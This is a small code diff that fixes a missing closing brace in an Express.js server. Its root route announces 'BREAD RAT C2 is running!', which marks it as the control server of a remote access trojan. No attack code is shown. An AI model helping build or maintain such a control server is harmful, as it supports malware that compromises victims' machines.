@@ -39,6 +39,7 @@ app.use('/api/logs', logsRoutes);
 // Root route untuk testing
 app.get('/', (req, res) => {
     res.send('🍞 BREAD RAT C2 is running!');
+});
 
 app.get('/test', (req, res) => {
     res.json({ status: 'ok', message: 'Test route works' });
